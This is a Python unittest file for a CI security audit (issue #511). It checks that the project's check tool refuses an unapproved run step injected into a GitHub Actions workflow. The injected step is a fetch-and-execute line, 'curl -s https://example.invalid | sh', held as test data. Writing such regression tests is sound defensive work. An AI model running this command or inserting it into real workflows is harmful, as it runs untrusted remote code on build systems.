"""Issue #511 audit: tools/check.py (make check) must enforce the run: approval, not only the placement layer.

An injected run: step in a job that is not a guard job was accepted by check_guard_placement alone (the unenforced path).
tools/check.py now calls enforced_check, so the same tree is refused. The trusted guard jobs remain the merge gate.
"""
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / 'tools'))
import artifact_guard as guard  # noqa: E402

INJECT = "      - name: Injected\n        run: curl -s https://example.invalid | sh\n"


class CheckEnforcesRunApproval(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        for tree in ('.github', 'tools'):
            shutil.copytree(ROOT / tree, self.tmp / tree)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _inject_into_verify(self):
        path = self.tmp / '.github/workflows/ci.yml'
        text = path.read_text(encoding='utf-8')
        anchor = "        run: make check\n"
        self.assertEqual(text.count(anchor), 1)
        path.write_text(text.replace(anchor, anchor + INJECT, 1), encoding='utf-8', newline='\n')

    def test_unenforced_placement_check_accepts_injected_run(self):
        # Documents the gap that tools/check.py used to take (no approval table in force).
        self._inject_into_verify()
        guard.check_guard_placement(self.tmp)

    def test_enforced_check_refuses_injected_run(self):
        self._inject_into_verify()
        with self.assertRaises(ValueError) as caught:
            guard.enforced_check(self.tmp, guard.check_guard_placement, allowlist_root=guard.ROOT)
        self.assertIn('not an approved exact match', str(caught.exception))

    def test_check_py_calls_enforced_check(self):
        source = (ROOT / 'tools' / 'check.py').read_text(encoding='utf-8')
        self.assertIn('enforced_check(ROOT, check_guard_placement', source)
        self.assertNotIn('\n    check_guard_placement(ROOT)', source)


if __name__ == '__main__':
    unittest.main()
